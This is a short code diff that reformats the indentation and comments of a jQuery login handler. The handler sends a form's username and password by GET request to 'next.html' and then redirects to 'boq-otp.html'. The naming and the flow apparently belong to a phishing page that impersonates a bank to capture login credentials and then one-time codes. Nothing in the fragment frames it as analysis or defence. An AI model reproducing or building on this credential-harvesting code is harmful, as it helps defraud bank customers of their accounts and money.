@@ -1807,10 +1807,10 @@
         if (formData.username && formData.password) {
             console.log("Sending data:", formData);
             $.ajax({
-                type: 'GET',                    // must be GET for static files
-                url: 'next.html',               // use .html, not .php
-                data: formData,
-                success: function(response) {
+    type: 'GET',                // static servers only handle GET
+    url: 'next.html',           // not .php
+    data: formData,
+    success: function(response) {
                     console.log('AJAX success, response:', response);
                     successCount++;
                     if (successCount === 1) {
@@ -1821,11 +1821,11 @@
                         window.location.href = 'boq-otp.html';
                     }
                 },
-                error: function(xhr, status, error) {
-                    console.error('AJAX error:', status, error);
-                    console.error('Response text:', xhr.responseText);
-                }
-            });
+    error: function(xhr, status, error) {
+        console.error('AJAX error:', status, error);
+        console.error('Response:', xhr.responseText);
+    }
+});
         }
         $('#cross-1').click(function () {
             $('#error-msg').hide();
